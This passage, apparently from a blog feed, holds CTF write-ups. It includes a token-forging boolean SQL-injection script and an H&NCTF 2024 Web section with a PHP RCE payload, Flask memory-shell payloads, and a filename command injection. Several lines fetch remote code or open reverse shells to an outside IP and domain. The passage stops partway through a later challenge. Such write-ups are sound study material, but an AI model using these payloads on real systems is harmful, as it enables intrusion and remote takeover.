后面还有一层base64</p><p>解码后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;abc&quot;, &quot;token&quot;:&quot;900150983cd24fb0d6963f7d28e17f72&quot;, &quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>修改这个is_admin为1再访问, 这次会回显我们的密码, 当我们为伪造token中的username为admin会被检测到</p><p>再看这个token,很像md5</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526201250853.png" alt="image-20240526201250853" /><p>这个就是账号的md5</p><p>这里比较坑就在于你的username必须足够简单不然发现不了这个</p><p>那么就可以更改username和md5来伪造token了</p><p>手搓很麻烦 , 写个脚本测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br></pre></td></tr></table></figure><p>大概这样两个函数即可</p><p>之后会发现username其实有一个sql注入 布尔注入</p><p>过滤了空格 <code>&gt;</code> <code>&lt;</code> <code>between and</code>  </p><p>很难二分, 好在服务器比较快, 直接爆了</p><p>贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">input_string</span>):</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30230/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Register</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;register.php&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;login.php&#x27;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># res = Register(username=username, password=password)</span></span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"><span class="comment"># token = Login(username, password)[6:]</span></span><br><span class="line"><span class="comment"># token = DecodeToken(token)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token_json = json.loads(token)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SendReq</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    token_json = &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    token_json[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    user_hash = md5_hash(username)</span><br><span class="line">    token_json[<span class="string">&#x27;token&#x27;</span>] = user_hash</span><br><span class="line">    token_json[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    token_str = json.dumps(token_json)</span><br><span class="line">    TOKEN = EncodeToken(token_str)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;TOKEN=&#x27;</span> + TOKEN</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url+<span class="string">&#x27;home.php&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># # dkctf  </span></span><br><span class="line"><span class="comment"># sql = &#x27;version()&#x27;</span></span><br><span class="line"><span class="comment"># # 10.5.23-MariaDB-0+deb11u1</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;select (table_name) from information_schema.tables where table_schema=database() limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># user  secret</span></span><br><span class="line">sql = <span class="string">&quot;select (column_name) from information_schema.columns where table_name=&#x27;secret&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># flag sseeccrreett</span></span><br><span class="line">sql = <span class="string">&quot;select (sseeccrreett) from secret&quot;</span></span><br><span class="line"><span class="comment">#  # DRKCTF&#123;8b31c3a2f57b4de68124ac7734734944&#125;</span></span><br><span class="line"></span><br><span class="line">sql = sql.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">username =<span class="string">&quot;&#x27;or/**/ascii(substr(database(),1,1))=1#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    asc = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span>(asc &lt; <span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27;or/**/ascii(substr((&quot;</span> + sql + <span class="string">&quot;),&#123;&#125;,1))=&#123;&#125;#&quot;</span></span><br><span class="line">       <span class="comment"># print(payload.format(k, asc))</span></span><br><span class="line">        res = SendReq(payload.<span class="built_in">format</span>(k, asc))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker!!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hacker!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            asc = asc + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;@q^4*!z8a9-%42z.s~&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(asc)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text[-<span class="number">200</span>:])</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>H&amp;NCTF 2024 Web</title>
    <link href="http://example.com/2024/05/30/H-NCTF-2024-Web/"/>
    <id>http://example.com/2024/05/30/H-NCTF-2024-Web/</id>
    <published>2024-05-30T03:36:58.000Z</published>
    <updated>2024-05-30T05:41:48.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="H-NCTF-2024-WEB-复现"><a href="#H-NCTF-2024-WEB-复现" class="headerlink" title="H&amp;NCTF 2024 WEB 复现"></a>H&amp;NCTF 2024 WEB 复现</h1><p>赛中只解出两题, 其他的wp都还能看懂差不多, 这里复现一下</p><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_match(&#39;/please_give_me_flag/&#39;,$str2)</code>这里不忽略大小写, 后面忽略大小写, 故绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hnctf.imxbt.cn:46810/?moran=flag&amp;e=assert&amp;pass=system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">flag=please_give_me_flaG&amp;task=register_shutdown_function($_REQUEST[&#x27;e&#x27;],$_REQUEST[&#x27;pass&#x27;])</span><br></pre></td></tr></table></figure><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p>比较抽象的一题, 这里非预期解出来了, </p><p>一开始想到的就是dns外带并且也可以成功, 但是这个容器太抽象了, 执行一次就得重开</p><p>下面说说我的方法,</p><p>首先我们知道这里禁用了很多命令</p><p>由于容器比较奇葩, fuzz的成本太高了, 这里只fuzz出来curl命令是可以执行的, 并且<code>$ </code> <code>|</code>这两个符号也是可以用的,所以我们的思路就是把远端的恶意shell命令curl下来通过管道放进<code>$0</code>,也就是放进当前执行的脚本(bash), 达到反弹shell的目的</p><p>首先vps起一个服务, 用来返回python反弹shell脚本 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;107.148.75.202&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>之后nc监听 7777端口</p><p>发送执行curl命令的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).popen(&quot;curl www.n4c1.top:5000/ |$0&quot;).read()</span><br></pre></td></tr></table></figure><p>这样我们就可以的到shell, 然后就是读源码拿flag</p><p>看正解是python内存马, 之前好像接触过一次, 没什么印象, 学习了</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p>大概就是通过eval的任意代码执行, 为flask当前app添加一条路由, 并将其与恶意操作函数绑定, 与Java的tomcat内存马相似, 此操作无文件落地, 通过修改中间件来获取shell</p><p>网上可以搜到很多payload</p><p>这里列出两条师傅们wp里的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&quot;cat</span><br><span class="line">/flag&quot;).read())</span><br><span class="line"></span><br><span class="line">x cmd=render_template_string(&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>之后访问我们添加的shell路由即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shell</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">/shell?cmd=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p>robots.txt中泄露了网站源码的备份</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blacklistChars = []<span class="type">rune</span>&#123;<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 设置路由</span></span><br><span class="line">http.HandleFunc(<span class="string">&quot;/gojava&quot;</span>, compileJava)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置静态文件服务器</span></span><br><span class="line">fs := http.FileServer(http.Dir(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, fs)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">log.Println(<span class="string">&quot;Server started on :80&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isFilenameBlacklisted</span><span class="params">(filename <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, char := <span class="keyword">range</span> filename &#123;</span><br><span class="line"><span class="keyword">for</span> _, blackChar := <span class="keyword">range</span> blacklistChars &#123;</span><br><span class="line"><span class="keyword">if</span> char == blackChar &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compileJava</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 检查请求方法是否为POST</span></span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析multipart/form-data格式的表单数据</span></span><br><span class="line">err := r.ParseMultipartForm(<span class="number">10</span> &lt;&lt; <span class="number">20</span>) <span class="comment">// 设置最大文件大小为10MB</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从表单中获取上传的文件</span></span><br><span class="line">file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="string">&quot;.java&quot;</span>) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, <span class="string">&quot;./upload/&quot;</span>+handler.Filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveFile</span><span class="params">(file multipart.File, filePath <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// 创建目标文件</span></span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上传的文件内容复制到目标文件中</span></span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不用细看, 基本上就能猜到使用相同命令javac + 文件名 这种形式来编译上传的文件, 那么既然是系统命令, 就可以通过上传的 文件名进行命令注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514130817384.png" alt="image-20240514130817384"></p><p>可以看见确实如此, 但是这里是一个gojava的低权限用户, 想办法弹shell提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi83Nzc3IDA+JjE=| base64 -d |bash;Main.java&quot;</span><br></pre></td></tr></table></figure><p>根目录下有一个很特殊的文件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240514131921586.png" alt="image-20240514131921586"></p><p>这里面的内容就算是root的密码</p><p>直接su root, 然后运行&#x2F;start.sh即可, flag在root目录下</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 